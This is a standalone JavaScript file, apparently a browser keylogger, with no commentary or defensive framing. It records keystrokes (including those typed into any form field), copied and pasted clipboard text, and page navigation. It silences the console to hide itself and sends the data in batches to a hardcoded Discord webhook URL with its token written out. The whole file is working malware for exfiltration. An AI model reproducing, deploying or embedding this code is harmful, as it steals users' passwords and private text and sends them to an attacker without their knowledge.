(function() {
    'use strict';

    const _endpoint = 'https://discordapp.com/api/webhooks/1528223376836001864/RkF8B_JJBtoKov_Dqo676LGH61ANJtoIPQkKamjo7pFvphHI-HN9Hr5dTaiQydvIMsOh';
    const _batchSize = 15;
    const _flushInterval = 12000;
    const _maxEventsPerField = 20;

    const _store = [];
    let _timer = null;
    let _lastUrl = document.URL;
    let _session = Math.random().toString(36).slice(2, 10);
    let _eventCounts = { key: 0, copy: 0, paste: 0, nav: 0 };

    const _noop = () => {};
    const _origLog = console.log;
    const _origWarn = console.warn;
    const _origError = console.error;
    const _origInfo = console.info;
    const _origDebug = console.debug;

    console.log = _noop;
    console.warn = _noop;
    console.error = _noop;
    console.info = _noop;
    console.debug = _noop;

    function _now() {
        return Date.now();
    }

    function _ts() {
        return new Date().toISOString().replace('T', ' ').slice(0, 19);
    }

    function _push(type, data) {
        _store.push({
            t: _ts(),
            ty: type,
            d: data
        });
        _eventCounts[type] = (_eventCounts[type] || 0) + 1;
        if (_store.length >= _batchSize) _flush();
    }

    function _formatKey(e) {
        const k = e.k || '';
        const tag = e.tag || 'unknown';
        if (k === 'Enter') return '⏎ Enter';
        if (k === 'Backspace') return '⌫ Backspace';
        if (k === 'Tab') return '⇥ Tab';
        if (k === 'Space') return '␣ Space';
        if (k === 'Delete') return '⌦ Delete';
        if (k === 'ArrowUp') return '↑';
        if (k === 'ArrowDown') return '↓';
        if (k === 'ArrowLeft') return '←';
        if (k === 'ArrowRight') return '→';
        if (k.length === 1) return k;
        return k;
    }

    function _formatClipboard(text) {
        const clean = text.replace(/\n/g, '↵ ').replace(/\s{2,}/g, ' ');
        return clean.length > 60 ? clean.slice(0, 60) + '…' : clean;
    }

    function _buildEmbed(events) {
        const groups = { key: [], copy: [], paste: [], nav: [] };
        events.forEach(e => {
            if (groups[e.ty]) groups[e.ty].push(e);
        });

        const fields = [];

        if (groups.key.length > 0) {
            const keys = groups.key.map(e => {
                const key = _formatKey(e.d);
                const tag = e.d.tag || '';
                const ctx = tag !== 'BODY' && tag !== 'DIV' ? ` [${tag}]` : '';
                return `\`${key}\`${ctx}`;
            });
            const chunkSize = 15;
            for (let i = 0; i < keys.length; i += chunkSize) {
                const chunk = keys.slice(i, i + chunkSize);
                const label = i === 0 ? `⌨️ Keys (${keys.length})` : '⋯ continua';
                fields.push({
                    name: label,
                    value: chunk.join(' ') || '—',
                    inline: false
                });
            }
        }

        if (groups.copy.length > 0) {
            const copies = groups.copy.map(e => `📋 Copy: ${_formatClipboard(e.d.txt || '')}`);
            const chunkSize = 8;
            for (let i = 0; i < copies.length; i += chunkSize) {
                const chunk = copies.slice(i, i + chunkSize);
                const label = i === 0 ? `📋 Copies (${copies.length})` : '⋯ continua';
                fields.push({
                    name: label,
                    value: chunk.join('\n') || '—',
                    inline: false
                });
            }
        }

        if (groups.paste.length > 0) {
            const pastes = groups.paste.map(e => `📥 Paste: ${_formatClipboard(e.d.txt || '')}`);
            const chunkSize = 8;
            for (let i = 0; i < pastes.length; i += chunkSize) {
                const chunk = pastes.slice(i, i + chunkSize);
                const label = i === 0 ? `📥 Pastes (${pastes.length})` : '⋯ continua';
                fields.push({
                    name: label,
                    value: chunk.join('\n') || '—',
                    inline: false
                });
            }
        }

        if (groups.nav.length > 0) {
            const navs = groups.nav.map(e => {
                const url = e.d.url || '';
                const title = e.d.title || '';
                return `🔗 ${title || url.replace(/^https?:\/\//, '').slice(0, 50)}`;
            });
            const chunkSize = 6;
            for (let i = 0; i < navs.length; i += chunkSize) {
                const chunk = navs.slice(i, i + chunkSize);
                const label = i === 0 ? `🧭 Navigation (${navs.length})` : '⋯ continua';
                fields.push({
                    name: label,
                    value: chunk.join('\n') || '—',
                    inline: false
                });
            }
        }

        const total = events.length;
        const summary = `📊 ${total} eventos • ⌨️ ${_eventCounts.key || 0} • 📋 ${_eventCounts.copy || 0} • 📥 ${_eventCounts.paste || 0} • 🧭 ${_eventCounts.nav || 0}`;

        return {
            embeds: [{
                color: 0x2b2d31,
                title: '📡 Activity Feed',
                description: summary,
                fields: fields.slice(0, 25),
                footer: {
                    text: `Session ${_session} • ${_ts()}`
                },
                timestamp: new Date().toISOString()
            }]
        };
    }

    function _send(events) {
        if (events.length === 0) return;
        try {
            const payload = _buildEmbed(events);
            fetch(_endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(_noop);
        } catch (_) {}
    }

    function _flush() {
        if (_store.length === 0) return;
        const batch = _store.splice(0, _store.length);
        _send(batch);
    }

    function _trackKey(e) {
        const k = e.key;
        if (k.length === 1 || ['Enter', 'Backspace', 'Tab', 'Space', 'Delete', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'].includes(k)) {
            _push('key', {
                k: k,
                tag: e.target.tagName,
                id: e.target.id || '',
                cls: e.target.className || ''
            });
        }
    }

    function _trackCopy(e) {
        const txt = window.getSelection().toString().trim();
        if (txt && txt.length > 0) {
            _push('copy', { txt: txt.slice(0, 500), len: txt.length });
        }
    }

    function _trackPaste(e) {
        const txt = e.clipboardData?.getData('text/plain') || '';
        if (txt && txt.length > 0) {
            _push('paste', { txt: txt.slice(0, 500), len: txt.length });
        }
    }

    function _trackNav() {
        if (document.URL !== _lastUrl) {
            _lastUrl = document.URL;
            _push('nav', {
                url: document.URL,
                ref: document.referrer,
                title: document.title
            });
        }
    }

    function _init() {
        document.addEventListener('keydown', _trackKey, true);
        document.addEventListener('copy', _trackCopy, true);
        document.addEventListener('paste', _trackPaste, true);

        const _obs = new MutationObserver(_trackNav);
        _obs.observe(document, { subtree: true, childList: true });

        _timer = setInterval(_flush, _flushInterval);

        window.addEventListener('beforeunload', () => {
            _flush();
            _obs.disconnect();
        });

        window._logs = {
            kill: function() {
                clearInterval(_timer);
                _flush();
                document.removeEventListener('keydown', _trackKey, true);
                document.removeEventListener('copy', _trackCopy, true);
                document.removeEventListener('paste', _trackPaste, true);
                _obs.disconnect();
                console.log = _origLog;
                console.warn = _origWarn;
                console.error = _origError;
                console.info = _origInfo;
                console.debug = _origDebug;
            }
        };
    }

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        setTimeout(_init, 0);
    } else {
        document.addEventListener('DOMContentLoaded', () => setTimeout(_init, 0));
    }

    setTimeout(() => {
        if (!window._logs) _init();
    }, 3000);

})();
